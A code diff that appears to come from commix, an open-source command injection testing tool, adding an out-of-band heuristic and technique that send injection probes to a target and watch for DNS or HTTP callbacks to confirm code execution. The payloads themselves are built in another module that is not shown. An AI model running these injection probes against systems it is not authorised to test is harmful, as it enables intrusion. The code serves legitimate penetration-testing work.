@@ -32,6 +32,7 @@ from src.core.requests import authentication
 from src.core.injections.controller import checks
 from src.thirdparty.six.moves import urllib as _urllib
 from src.core.injections.blind.techniques.time_based import tb_handler
+from src.core.injections.blind.techniques.oob import oob_handler
 from src.core.injections.semiblind.techniques.file_based import fb_handler
 from src.core.injections.semiblind.techniques.tempfile_based import tfb_handler
 from src.core.injections.results_based.techniques.classic import cb_handler
@@ -54,7 +55,10 @@ def basic_payload_generator():
 
   suffix = ""
   if settings.USE_BACKTICKS:
+    # 'expr' wants its operands as separate arguments - given one, it echoes the string back
+    # instead of adding anything up.
     prefix = "expr "
+    calc_string = str(rand_a) + settings.SINGLE_WHITESPACE + "%2B" + settings.SINGLE_WHITESPACE + str(rand_b)
   else:
     prefix = "("
     suffix = ")"
@@ -164,6 +168,15 @@ def heuristic_request(url, http_request_method, check_parameter, payload, whites
   return response, url
 
 """
+Announce what the heuristic found. One wording for every channel it can come back over - which one
+answered is the technique's business, not something to commit to while still guessing.
+"""
+def announce_heuristic_finding(possible_os):
+  info_msg = "Heuristic (basic) test shows that "
+  info_msg += settings.CHECKING_PARAMETER + " might be injectable (possible operating system: '" + possible_os + "')."
+  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+
+"""
 Heuristic (basic) test for command injection
 """
 def command_injection_heuristic_basic(url, http_request_method, check_parameter):
@@ -195,9 +208,7 @@ def command_injection_heuristic_basic(url, http_request_method, check_parameter)
                 settings.TARGET_OS = settings.OS.UNIX
               else:
                 settings.TARGET_OS = settings.OS.WINDOWS
-              info_msg = "Heuristic (basic) test shows that "
-              info_msg += settings.CHECKING_PARAMETER + " might be injectable (possible operating system: '" + possible_os + "')."
-              settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+              announce_heuristic_finding(possible_os)
               settings.SKIP_CODE_INJECTIONS = True
               break
 
@@ -207,6 +218,90 @@ def command_injection_heuristic_basic(url, http_request_method, check_parameter)
   except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
     settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
     raise SystemExit()
+
+"""
+Heuristic (basic) test over the out-of-band channel.
+
+The results-based test reads the sum back out of the response, so it is blind to exactly the points
+'--oob' exists for. Without this, such a parameter is reported as probably not injectable - and with
+'--smart' it would be skipped outright.
+"""
+def oob_heuristic_basic(url, http_request_method, check_parameter):
+  from src.core.injections.blind.techniques.oob import oob_payloads as oob_payloads
+
+  channel = checks.init_oob_channel()
+  if channel is None:
+    return url
+
+  # Both, unless the results-based test already settled which one it is - or the user has said so
+  # with '--os', which no heuristic of ours gets to overrule.
+  target_systems = (settings.OS.UNIX, settings.OS.WINDOWS)
+  if settings.IDENTIFIED_COMMAND_INJECTION or menu.options.os:
+    target_systems = (settings.TARGET_OS,)
+
+  attempts = []
+  for target_os in target_systems:
+    payload, probes = oob_payloads.heuristic_payload(channel, target_os)
+    if settings.VERBOSITY_LEVEL != 0:
+      settings.print_data_to_stdout(settings.print_payload(payload))
+    heuristic_request(url, http_request_method, check_parameter, payload, settings.WHITESPACES[0])
+    attempts.append((target_os, probes))
+
+  # A name lookup beats an HTTPS round trip almost every time, so the client that answers first is
+  # nearly always the one least worth leading with. Once only a lookup has landed, hold the window
+  # open a little longer for an HTTP client rather than settling on the spot.
+  def _http_first():
+    best = None
+    for target_os, probes in attempts:
+      for token, transport in probes:
+        if not channel.seen(token, protocol=oob_payloads.required_protocol(transport)):
+          continue
+        if oob_payloads.required_protocol(transport) == "http":
+          return (target_os, transport)
+        if best is None:
+          best = (target_os, transport)
+    return best
+
+  channel.poll_now()
+  answered = None
+  deadline = time.time() + settings.OOB_TIMEOUT
+  while time.time() < deadline:
+    answered = _http_first()
+    if answered is not None:
+      if oob_payloads.required_protocol(answered[1]) == "http":
+        break
+      # Only a lookup so far - give an HTTP client a brief grace period to follow it in.
+      deadline = min(deadline, time.time() + settings.OOB_HTTP_GRACE)
+    # Asked for every round: the idle interval would hold the answer back for seconds after it lands.
+    channel.poll_now()
+    time.sleep(settings.OOB_WAIT_POLL_INTERVAL)
+
+  if answered is None:
+    return url
+
+  target_os, transport = answered
+  # The lookup came back, so the payload around it ran - and any HTTP client in that same payload
+  # has already had its chance on a boundary that works. Naming them here keeps the sweep from
+  # asking them again on every boundary it tries.
+  if oob_payloads.required_protocol(transport) == "dns":
+    silent = [candidate for _, probes in attempts for token, candidate in probes
+              if oob_payloads.required_protocol(candidate) == "http" and not channel.seen(token, protocol="http")]
+    settings.OOB_HEURISTIC_HTTP_SILENT = list(dict.fromkeys(silent))
+  # Already identified means the results-based test got there first, so the interaction is not
+  # news - which client the target answered on still is, and the sweep leads with it.
+  already_identified = settings.IDENTIFIED_COMMAND_INJECTION
+  settings.IDENTIFIED_COMMAND_INJECTION = True
+  settings.OOB_HEURISTIC_TRANSPORT = transport
+  settings.SKIP_CODE_INJECTIONS = True
+  if already_identified:
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "The target answered out-of-band over '" + transport + "'."
+      settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+    return url
+  if not menu.options.os:
+    settings.TARGET_OS = target_os
+  announce_heuristic_finding("Windows" if settings.TARGET_OS == settings.OS.WINDOWS else "Unix-like shell")
+  return url
 
 """
 Heuristic (basic) test for code injection warnings
@@ -316,6 +411,19 @@ def filebased_command_injection_technique(url, timesec, filename, http_request_m
       settings.IDENTIFIED_COMMAND_INJECTION = True
     return result
   run_technique(injection_type, technique, "FILE_BASED_STATE", "SKIP_COMMAND_INJECTIONS", "f", exploit)
+
+"""
+Check if it's exploitable via out-of-band technique.
+"""
+def oob_command_injection_technique(url, timesec, filename, http_request_method):
+  injection_type = settings.INJECTION_TYPE.BLIND
+  technique = settings.INJECTION_TECHNIQUE.OOB
+  def exploit():
+    result = oob_handler.exploitation(url, timesec, filename, http_request_method, injection_type, technique)
+    if result != False:
+      settings.IDENTIFIED_COMMAND_INJECTION = True
+    return result
+  run_technique(injection_type, technique, "OOB_STATE", "SKIP_OOB_INJECTIONS", "o", exploit)
 
 """
 Check parameter in HTTP header.
@@ -570,6 +678,11 @@ def injection_process(url, check_parameter, http_request_method, filename, times
           if not (len(menu.options.tech) == 1 and "e" in menu.options.tech):
             url = command_injection_heuristic_basic(url, http_request_method, check_parameter)
 
+          # Asked for out-of-band, so probe the channel either way: whether the target can reach it
+          # at all, and over which client, is a separate question from whether it is injectable.
+          if menu.options.oob:
+            url = oob_heuristic_basic(url, http_request_method, check_parameter)
+
           if not settings.IDENTIFIED_COMMAND_INJECTION and "e" in menu.options.tech:
             # Check for identified warnings
             url = code_injections_heuristic_basic(url, http_request_method, check_parameter)
@@ -639,6 +752,7 @@ def injection_process(url, check_parameter, http_request_method, filename, times
         lambda: dynamic_code_evaluation_technique(url, timesec, filename, http_request_method),
         _run_time_based,
         _run_file_based,
+        lambda: oob_command_injection_technique(url, timesec, filename, http_request_method),
       ]
       technique_idx = 0
       while technique_idx < len(techniques):
